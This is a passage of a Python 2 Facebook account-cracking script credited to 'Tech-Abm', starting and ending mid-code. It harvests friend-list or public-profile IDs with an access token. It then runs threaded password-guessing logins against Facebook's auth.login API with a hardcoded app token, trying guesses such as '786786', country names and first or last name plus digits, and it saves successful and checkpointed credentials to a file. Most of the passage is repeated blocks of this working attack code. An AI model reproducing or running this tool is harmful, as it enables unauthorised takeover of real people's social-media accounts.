					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = ('India') 
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					s = json.load(data)
					if 'access_token' in s:
						print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in s["error_msg"]:
							print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass2
							cek = open("out/checkpoint.txt", "k")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = y['first_name'] + '123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							s = json.load(data)
							if 'access_token' in s:
								print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in s["error_msg"]:
									print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass3
									cek = open("out/checkpoint.txt", "k")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = y['first_name'] + '12345'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									s = json.load(data)
									if 'access_token' in s:
										print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in s["error_msg"]:
											print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass4
											cek = open("out/checkpoint.txt", "k")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = y['first_name'] + '786'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											s = json.load(data)
											if 'access_token' in s:
												print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in s["error_msg"]:
													print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass5
													cek = open("out/checkpoint.txt", "k")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = y['last_name'] + '123'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													s = json.load(data)
													if 'access_token' in s:
														print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\x1b[1;97m' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in s["error_msg"]:
															print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass6
															cek = open("out/checkpoint.txt", "k")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = y['last_name'] + '786'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															s = json.load(data)
															if 'access_token' in s:
																print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in s["error_msg"]:
																	print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass7
																	cek = open("out/checkpoint.txt", "k")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																												   	
											                               
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;97m «--------------------------------------------»"
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	menu()
	
def pakarmy():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
        print "\033[1;97m «--------------------------------------------»"
	print( "\x1b[1;32;92m[1] \033[1;33;93m>> Crack From Friendlist \033[1;97m(\033[1;91mTech Abm\033[1;97m)") 
	time.sleep(0.05)
	print( "\x1b[1;32;92m[2] \033[1;33;98m>> Crack From Public ID \033[1;97m(\033[1;91mTech Abm\033[1;97m)") 
	time.sleep(0.05)
	print( "\x1b[1;32;36m[0] \033[1;33;96m>> Back") 
	print "\033[1;97m «--------------------------------------------»"
	pilih_pakarmy()

def pilih_pakarmy():
	peak = raw_input("\n\033[1;31;40m>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_pakarmy()
        elif peak =="1":
		os.system('clear')
		print logo
		print "\033[1;97m «--------------------------------------------»"
		jalan('\033[1;96m[⊱⋕⊰] \033[1;92mGetting ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		print "\033[1;97m «--------------------------------------------»"
		idt = raw_input("\033[1;96m[⊱⋕⊰]\033[1;93m Enter ID/USERNAME\033[1;91m : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;31;37m[⊱⋕⊰] Name : "+op["name"]
		except KeyError:
			print"\x1b[1;37m[⊱⋕⊰] ID Not Found!"
			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
			super()
		print"\033[1;35;37m[⊱⋕⊰] Getting ID Loading process........ "
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()

	print "\033[1;36;96m[⊱⋕⊰] Total IDs : \033[1;92m"+str(len(id))
	jalan('\033[1;34;96m[⊱⋕⊰] Please Wait ')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m  «-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
	print "\033[1;97m «--------------------------------------------»"
	jalan('   \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
        jalan(' \033[1;91m            Create By : Tech-Abm')
	print "\033[1;97m «--------------------------------------------»"

	def main(arg):
		global oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:Tech-abm
		try:													
			k = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			y = json.loads(k.text)
			pass1 = ('786786')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			s = json.load(data)
			if 'access_token' in s:
				print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in s["error_msg"]:
					print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass1
					cek = open("out/checkpoint.txt", "k")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = ('Bangladesh') 
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					s = json.load(data)
					if 'access_token' in s:
						print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in s["error_msg"]:
							print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass2
							cek = open("out/checkpoint.txt", "k")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = y['first_name'] + '123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							s = json.load(data)
							if 'access_token' in s:
								print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in s["error_msg"]:
									print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass3
									cek = open("out/checkpoint.txt", "k")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = y['first_name'] + '12345'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									s = json.load(data)
									if 'access_token' in s:
										print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in s["error_msg"]:
											print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass4
											cek = open("out/checkpoint.txt", "k")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = y['first_name'] + '786'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											s = json.load(data)
											if 'access_token' in s:
												print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in s["error_msg"]:
													print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass5
													cek = open("out/checkpoint.txt", "k")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = y['last_name'] + '123'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													s = json.load(data)
													if 'access_token' in s:
														print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\x1b[1;97m' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in s["error_msg"]:
															print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass6
															cek = open("out/checkpoint.txt", "k")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = y['last_name'] + '786'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															s = json.load(data)
															if 'access_token' in s:
																print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in s["error_msg"]:
																	print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass7
																	cek = open("out/checkpoint.txt", "k")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																												   	
											                               
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;97m «--------------------------------------------»"
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	menu()
	
def hackerz():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
        print "\033[1;97m «--------------------------------------------»"
	print( "\x1b[1;32;92m[1] \033[1;33;93m>> Crack From Friendlist \033[1;97m(\033[1;91mTech Abm\033[1;97m)") 
	time.sleep(0.05)
	print( "\x1b[1;32;92m[2] \033[1;33;98m>> Crack From Public ID \033[1;97m(\033[1;91mTech Abm\033[1;97m)") 
	time.sleep(0.05)
	print( "\x1b[1;32;36m[0] \033[1;33;96m>> Back") 
	print "\033[1;97m «--------------------------------------------»"
	pilih_hackerz()

def pilih_hackerz():
	peak = raw_input("\n\033[1;31;40m>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_hackerz()
        elif peak =="1":
		os.system('clear')
		print logo
		print "\033[1;97m «--------------------------------------------»"
		jalan('\033[1;96m[⊱⋕⊰] \033[1;92mGetting ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		print "\033[1;97m «--------------------------------------------»"
		idt = raw_input("\033[1;96m[⊱⋕⊰]\033[1;93m Enter ID/USERNAME\033[1;91m : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;31;37m[⊱⋕⊰] Name : "+op["name"]
		except KeyError:
			print"\x1b[1;37m[⊱⋕⊰] ID Not Found!"
			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
			super()
		print"\033[1;35;37m[⊱⋕⊰] Getting ID Loading process........ "
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()

	print "\033[1;36;96m[⊱⋕⊰] Total IDs : \033[1;92m"+str(len(id))
	jalan('\033[1;34;96m[⊱⋕⊰] Please Wait ')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m  «-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
	print "\033[1;97m «--------------------------------------------»"
	jalan('   \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
        jalan(' \033[1;91m            Create By : Tech-Abm')
	print "\033[1;97m «--------------------------------------------»"

	def main(arg):
		global oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:Tech-abm
		try:													
			k = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			y = json.loads(k.text)
			pass1 = ('786786')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			s = json.load(data)
			if 'access_token' in s:
				print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in s["error_msg"]:
					print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass1
					cek = open("out/checkpoint.txt", "k")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = ('Sayang') 
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					s = json.load(data)
					if 'access_token' in s:
						print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in s["error_msg"]:
							print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass2
							cek = open("out/checkpoint.txt", "k")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = y['first_name'] + '123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							s = json.load(data)
							if 'access_token' in s:
								print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in s["error_msg"]:
									print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass3
									cek = open("out/checkpoint.txt", "k")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = y['first_name'] + '12345'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									s = json.load(data)
									if 'access_token' in s:
										print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in s["error_msg"]:
											print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass4
											cek = open("out/checkpoint.txt", "k")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = y['first_name'] + '786'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											s = json.load(data)
											if 'access_token' in s:
												print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in s["error_msg"]:
													print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass5
													cek = open("out/checkpoint.txt", "k")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = y['last_name'] + '123'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													s = json.load(data)
													if 'access_token' in s:
														print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\x1b[1;97m' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in s["error_msg"]:
															print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass6
															cek = open("out/checkpoint.txt", "k")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = y['last_name'] + '786'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															s = json.load(data)
															if 'access_token' in s:
																print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in s["error_msg"]:
																	print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass7
																	cek = open("out/checkpoint.txt", "k")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																												   	
											                               
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;97m «--------------------------------------------»"
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	menu()
	
def america():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;96m «--------------------------------------------»" 
        print( "\x1b[1;32;92m[1] \033[1;33;93m>> Crack From Friendlist \033[1;97m(\033[1;91mTech Abm\033[1;97m)") 
	time.sleep(0.05)
	print( "\x1b[1;32;92m[2] \033[1;33;98m>> Crack From Public ID \033[1;97m(\033[1;91mTech Abm\033[1;97m)") 
	time.sleep(0.05)
	print( "\x1b[1;32;36m[0] \033[1;33;96m>> Back") 
	print "\033[1;96m «--------------------------------------------»" 
	pilih_america()

def pilih_america():
	peak = raw_input("\n\033[1;31;40m>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_america()
        elif peak =="1":
		os.system('clear')
		print logo
		print "\033[1;97m «--------------------------------------------»"
		jalan('\033[1;96m[⊱⋕⊰] \033[1;92mGetting ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		print "\033[1;97m «--------------------------------------------»"
		idt = raw_input("\033[1;96m[⊱⋕⊰]\033[1;93m Enter ID/USERNAME\033[1;91m : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;31;37m[⊱⋕⊰] Name : "+op["name"]
